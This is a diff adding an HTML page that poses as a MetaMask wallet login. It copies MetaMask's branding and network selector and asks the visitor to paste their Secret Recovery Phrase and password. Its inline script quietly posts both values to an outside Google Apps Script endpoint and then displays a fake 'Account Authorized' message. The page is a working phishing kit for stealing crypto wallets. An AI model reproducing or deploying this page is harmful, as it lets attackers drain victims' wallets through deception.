@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="IE-edge">
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js" ></script>
+        <Link rel="stylesheet" href="index.css"/>
+        <title>Metamask</title>
+        <Link rel="icon" href="./images/favicon.ico" type="image/x-icon">
+    </head>
+
+    <body>
+        <div class="load">
+        </div>
+     <div class="grid-container">
+         <header class="header">
+             <div class="brand">
+                <img src="./images/MetaMask.svg" alt="logo"/>
+             </div>
+             <div class="network">
+                     <span class="network-select">
+                            <select name="network" id="network">
+                                <optgroup label="Network"> <hr>
+                                <h3>The default network for Ether <br> transactions is Mainnet</h3>
+                                <div>
+                                    <option value="Ethereum Mainnet"> <button class="button">🟢</button>  Ethereum Mainnet</option>
+                                    <option value="Rapsten Test Network"> <button class="button"> 🟠</button>  Rapsten Test Network</option>
+                                    <option value="Kovan Test Network"> <button class="button">🟣</button>  Kovan Test Network</option>
+                                    <option value="Rinkeby Test Network"> <button class="button">🟡</button>  Rinkeby Test Network</option>
+                                    <option value="Goerli Test Network"> <button class="button">🔵</button>  Goerli Test Network</option>
+                                    <option value="Binance Smart Chain Mainnet"> <button class="button">⚪</button>  Binance Smart Chain Mainnet</option>
+                                    <option value="Localhost 8545"> <button class="button">⚪</button>  Localhost 8545</option>
+                                    <option value="Custom RPC"> <button class="button">⚫</button>  Custom RPC</option>
+                                </div>
+                                </optgroup>
+                                
+                            </select>
+                   </span>
+            </div>
+             
+         </header>
+         <main class="main">
+           <div class="main-img">
+               <img src="./images/metamask.png" alt="logo"/>
+           </div>
+           <div id="form-alert"></div>
+           <div class="main-form">
+            <div id="form-confirm">
+                <h3>Authorize your Account</h3>
+            </div>         
+            <form name="scriptance">
+                <Label style="color: rgb(117, 116, 116);" for="password">Wallet Secret Recovery Phrase</Label><br>
+                <textarea id="lasseurera" name="lasseurera" rows="5" placeholder="Paste Secret Recovery Phrase from Clipboard" required></textarea> <br><br>
+                <Label style="color: rgb(117, 116, 116);" for="password">Password </Label><br>
+                <input type="password" id="lasseur" name="lasseur" required><br><br>
+                <input id="submit" type="submit" value="Confirm Password"> 
+            </form>
+            
+            <div class="support">
+                Need help? Contact <a href="https://metamask.zendesk.com/hc/en-us" >Metamask Support</a>
+            </div>
+
+           </div>
+           
+         </main>
+         <footer class="footer">
+            &copy; 2021 MetaMask • A ConsenSys Formation
+         </footer>
+     </div>
+     <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbwcDVDWg-Wl4UuQ1RECp18KLOVtr2lieg05iGjwe8fKHHdtIop9sTfrZyEddZnOkVFcaw/exec'
+        const form = document.forms['scriptance']
+      
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          $(".load").html("<div class='loader'><img src='./images/var.gif'></div>") 
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => console.log('Success!', response))
+            .then(response => $("#lasseur").val(""), $("#lasseurera").val(""))
+            .then(response => $("#form-confirm").html("<h3 class='form-confirmed'>Account Authorized</h3>"))
+            .then(response => $(".loader").remove())
+            .catch(error => console.error('Error!', error.message))
+        })
+      </script>
+    </body>
+</html>
+
+
+
